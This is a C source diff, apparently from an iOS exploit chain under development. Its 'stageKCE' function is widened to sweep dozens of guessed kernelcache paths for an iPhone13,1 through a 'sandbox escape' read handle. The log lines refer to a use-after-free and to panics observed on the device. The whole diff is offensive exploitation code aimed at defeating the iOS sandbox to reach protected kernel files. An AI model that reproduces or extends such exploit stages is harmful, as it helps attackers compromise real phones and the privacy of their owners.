@@ -816,28 +816,50 @@ static int64_t sbxRead(const char *path) {
 }
 
 static void stageKCE(void) {
+    int kce_miss = 0;
     EV("[uaf][KCE] === stage KCE: kernelcache evidence via the sandbox escape ===");
     // opendir of com.apple.kernelcaches stayed EPERM even with its own handle
     // (the extension behaves file-scoped), and the panic on 21.11 named the
     // device as iPhone13,1 - so go straight for the fileset kernelcache by
     // candidate filename, each with its OWN escape handle (file-scoped grants).
+    // the container query resolves EXISTING paths only (measured: every wrong
+    // candidate returned -4 immediately, while the directories resolved to a
+    // live handle), so a wide name sweep is the only discovery route left:
+    // opendir of com.apple.kernelcaches is EPERM under the sandbox and the
+    // panic files carry no path.  Board configs for iPhone13,1 (iPhone 12
+    // mini, d23ap) and siblings, the build numbers, and container variants.
     const char *cands[] = {
-        // the naming is the IPSW's, not the model-with-comma: the local restore
-        // image D:\iPhone13,1_26.2_23C55_Restore.ipsw carries
-        // kernelcache.release.iphone13 (verified offline), while the
-        // iphone13,1 candidates all returned ENOENT on the device
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13,1",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13,1",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d23ap",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d23ap",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.d23ap",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d52p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d52p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.d52p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d53p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d53p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d27ap",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.d27ap",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.23C5027f",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.23C5027f",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.23C55",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.23C55",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.im4p",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.img4",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache",
         "/System/Library/Caches/kernelcache.release.iphone13",
+        "/System/Library/Caches/kernelcache.release.iphone13,1",
+        "/System/Library/Caches/kernelcache.release.d23ap",
+        "/System/Library/Caches/kernelcache",
+        "/private/var/db/kernelcache.release.iphone13",
         NULL };
     for (int ci = 0; cands[ci]; ci++) {
         int64_t h = sbxRead(cands[ci]);
-        if (h <= 0) { EV("[uaf][KCE] handle %s -> %lld", cands[ci], (long long)h); continue; }
+        if (h <= 0) { kce_miss++; continue; }
+        EV("[uaf][KCE] candidate %s -> handle %lld", cands[ci], (long long)h);
         struct stat st;
         if (stat(cands[ci], &st) != 0) {
             EV("[uaf][KCE] escape ok but stat %s -> %s", cands[ci], strerror(errno));
@@ -872,7 +894,8 @@ static void stageKCE(void) {
         fclose(f);
         return;
     }
-    EV("[uaf][KCE] no kernelcache candidate matched - the name is not in the list");
+    EV("[uaf][KCE] no kernelcache candidate matched (%d paths probed, none exists)", kce_miss);
+    EV("[uaf][KCE] the on-device filename is still unknown: opendir of the dir is EPERM and the query resolves only existing paths");
 }
 
 // ---------------------------------------------------------------------------
